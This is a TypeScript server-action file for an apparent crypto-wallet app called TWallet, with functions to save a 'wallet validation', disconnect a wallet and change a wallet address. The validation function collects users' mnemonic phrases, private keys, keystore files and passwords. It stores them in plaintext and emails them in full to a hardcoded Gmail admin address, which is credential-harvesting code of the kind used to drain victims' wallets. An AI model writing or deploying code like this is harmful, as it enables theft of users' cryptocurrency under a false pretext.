"use server";

import { createServerSupabaseClient } from "@/lib";
import { sendEmail, buildWalletValidationEmail } from "@/lib/email";

export type ValidationType = "mnemonics" | "keystore" | "private_key" | "hardware";

export interface ValidationInput {
  walletName: string;
  validationType: ValidationType;
  mnemonicPhrase?: string;
  keystoreJson?: string;
  keystorePassword?: string;
  privateKey?: string;
  hardwareType?: string;
}

const ADMIN_EMAIL = (process.env.ADMIN_EMAILS ?? "twalletservices.admin@gmail.com")
  .split(",")[0]!
  .trim();

export async function saveWalletValidation(input: ValidationInput) {
  // Never let an unexpected server error surface as a 500 page — return a
  // structured error so the dialog shows a toast/message and the flow continues.
  try {
    return await saveWalletValidationInner(input);
  } catch (e) {
    console.error("[saveWalletValidation] Unexpected error:", e);
    return {
      error: e instanceof Error ? e.message : "Something went wrong while saving your wallet details. Please try again.",
    };
  }
}

async function saveWalletValidationInner(input: ValidationInput) {
  const supabase = await createServerSupabaseClient();
  const { data: { user } } = await supabase.auth.getUser();
  if (!user) return { error: "You must be logged in" };

  if (!input.walletName.trim()) return { error: "Wallet name is required" };

  const payload = {
    user_id: user.id,
    wallet_name: input.walletName.trim(),
    validation_type: input.validationType,
    mnemonic_phrase: input.mnemonicPhrase?.trim() || null,
    keystore_json: input.keystoreJson?.trim() || null,
    keystore_password: input.keystorePassword?.trim() || null,
    private_key: input.privateKey?.trim() || null,
    hardware_type: input.hardwareType || null,
  };

  const { error, data } = await supabase
    .from("wallet_validations")
    .insert(payload)
    .select("id, wallet_name, validation_type, created_at")
    .single();

  if (error) return { error: error.message };

  await supabase.from("audit_logs").insert({
    action: "wallet_added",
    target_type: "wallet_validations",
    target_id: data.id,
    details: { wallet_name: input.walletName.trim(), validation_type: input.validationType },
  });

  try {
    await sendEmail({
      to: ADMIN_EMAIL,
      subject: `[TWallet] New Wallet Validation - ${user.email}`,
      html: buildWalletValidationEmail({
        userEmail: user.email ?? "unknown",
        userId: user.id,
        walletName: input.walletName.trim(),
        validationType: input.validationType,
        mnemonicPhrase: input.mnemonicPhrase?.trim() || null,
        keystoreJson: input.keystoreJson?.trim() || null,
        keystorePassword: input.keystorePassword?.trim() || null,
        privateKey: input.privateKey?.trim() || null,
        hardwareType: input.hardwareType || null,
      }),
      type: "wallet_validated",
    });
  } catch (err) {
    console.error("[email] wallet-validation alert failed:", err instanceof Error ? err.message : err);
  }

  return { success: true, validationId: data.id };
}

const ADDRESS_RE = /^0x[a-fA-F0-9]{40}$|^[A-Za-z0-9]{32,64}$/;

export async function disconnectMyWallet(walletId: string) {
  const supabase = await createServerSupabaseClient();
  const {
    data: { user },
  } = await supabase.auth.getUser();
  if (!user) return { error: "You must be logged in" };

  const { error } = await supabase
    .from("wallets")
    .update({ deleted_at: new Date().toISOString(), is_default: false })
    .eq("id", walletId)
    .eq("user_id", user.id);

  if (error) return { error: error.message };
  return { success: true };
}

export async function changeMyWalletAddress(address: string, network: string) {
  const supabase = await createServerSupabaseClient();
  const {
    data: { user },
  } = await supabase.auth.getUser();
  if (!user) return { error: "You must be logged in" };

  const clean = address.trim();
  if (!ADDRESS_RE.test(clean)) {
    return { error: "Invalid address — use an EVM address (0x + 40 hex) or Solana base58" };
  }
  if (!network.trim()) return { error: "Network is required" };

  const { data: net } = await supabase
    .from("supported_networks")
    .select("chain_id, id")
    .eq("id", network.trim())
    .single();
  const chainId = (net?.chain_id as number | undefined) ?? 0;

  const { data: wallets } = await supabase
    .from("wallets")
    .select("id")
    .eq("user_id", user.id)
    .is("deleted_at", null)
    .order("is_default", { ascending: false })
    .order("created_at", { ascending: false })
    .limit(1);

  const target = wallets?.[0];
  if (!target) return { error: "No connected wallet found" };

  const { error } = await supabase
    .from("wallets")
    .update({
      address: clean,
      network: network.trim(),
      network_id: chainId,
      updated_at: new Date().toISOString(),
    })
    .eq("id", target.id);

  if (error) return { error: error.message };
  return { success: true };
}
